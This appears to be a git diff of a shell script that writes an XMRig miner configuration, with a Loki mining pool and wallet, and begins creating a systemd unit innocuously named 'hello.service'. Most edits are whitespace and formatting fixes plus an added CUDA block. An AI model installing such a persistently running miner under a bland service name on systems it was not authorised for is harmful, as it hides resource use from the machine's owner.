@@ -36,7 +36,7 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
         "argon2-impl": null,
         "astrobwt-max-size": 550,
         "astrobwt-avx2": false,
-        "argon2": [0,1,2,3,4,5,6,7],
+		        "argon2": [0,1,2,3,4,5,6,7],
         "astrobwt": [-1],
         "cn": [
             [0,1,2,3,4,5,6,7]
@@ -53,8 +53,8 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
         "rx": [0,1,2,3,4,5,6,7],
         "rx/wow": [0,1,2,3,4,5,6,7],
         "cn/0": false,
-        "cn-lite/0": false,
-        "rx/arq": "rx/wow",
+        "cn-lite/0": false,             
+	"rx/arq": "rx/wow",
         "rx/keva": "rx/wow"
     },
     "opencl": {
@@ -71,6 +71,13 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
         "nvml": true,
         "cn/0": false,
         "cn-lite/0": false
+    },                             
+	    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true,
+        "cn/0": false,
+        "cn-lite/0": false
     },
     "donate-level": 1,
     "donate-over-proxy": 1,
@@ -78,7 +85,7 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
     "pools": [
         {
             "algo": "rx/loki",
-	    "coin": null
+            "coin": null,
             "url": "ca.loki.herominers.com:10111",
             "user": "LSTN6TsSrw1FSgDz5FeK8K3FNr6ATo9atRwhxCYEHJFcAv1ZLQmYSHa59pQWSvXDsc7PsZ7rxQ7ZMRj7zy96wzLU8355KWD",
             "pass": "x",
@@ -89,9 +96,9 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
             "tls": false,
             "tls-fingerprint": null,
             "daemon": false,
-            "socks5": null,
-            "self-select": null
-	        }
+            "socks5": null,             
+			"self-select": null
+        }
     ],
     "print-time": 60,
     "health-print-time": 60,
@@ -107,10 +114,11 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
         "ciphersuites": null,
         "dhparam": null
     },
-    "user-agent": null,
-    "verbose": 0,
+    "user-agent": null,   
+	"verbose": 0,
     "watch": true
 }
+
 EOL
 
 cat > /lib/systemd/system/hello.service <<EOL
